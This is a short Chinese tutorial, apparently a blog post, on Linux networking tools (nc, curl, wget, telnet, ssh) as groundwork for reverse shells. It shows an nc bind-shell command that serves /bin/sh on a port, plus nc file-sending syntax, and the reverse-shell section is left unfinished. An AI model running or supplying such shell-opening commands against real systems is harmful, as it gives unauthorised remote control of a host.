# 如何反弹shell

## linux下常见网络工具🧀

### netcat

netcat也就是平时用的nc，是一种功能丰富的网络调试和调查工具，它可以产生用户可能需要的几乎任何类型的连接，可以连接到远程主机`nc  -nvv Targert_IP  Targert_Port`，监听本地主机`nc  -l  -p  Local_Port`，端口扫描`nc  -v  target_IP  target_Port`、端口监听`nc  -l  -p  local_Port`、远程文件传输`nc  Targert_IP  Targert_Port  <  Targert_File`、正向shell、反向shell等等。

### curl

在Linux中curl是一个利用URL规则在[命令行](https://so.csdn.net/so/search?q=命令行&spm=1001.2101.3001.7020)下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，这个工具可以帮助我们在服务器上很好的模拟http的行为。

### wget

wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。

### curl和wget的区别

wget是个专职的下载利器，简单，专一，极致；而curl可以下载，但是长项不在于下载，而在于模拟提交web数据，POST/GET请求，调试网页，等等。在下载上，也各有所长，wget可以递归，支持断点；而curl支持URL中加入变量，因此可以批量下载。个人用途上，我经常用wget来下载文件，加 -c选项不怕断网；使用curl 来跟网站的API 交互，简便清晰。

#### ping

ping命令本身处于应用层，相当于一个应用程序，它直接使用网络层的ICMP协议，ping用来检查网络是否通畅或者网络连接速度的命令。

### telnet

telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet通常是用来探测指定ip是否开放指定端口。

### ssh

简单来书,ssh 和 telnet 是实现相同的功能 , ssh中 数据是经过加密的,是安全的 , 而 Telnet是明文传输的，ssh 是加密的，基于 SSL 。

## 正向shell如何连接

如果客户端连接服务器端，想要获取服务器端的shell，那么称为正向shell。

**本地主机：**

命令：nc  Targert_IP  Targert_Port 

**目标主机：**

命令：nc  -lvp  Targert_Port  -e  /bin/sh  

## 什么是反弹shell（先去吃个饭回来接着写

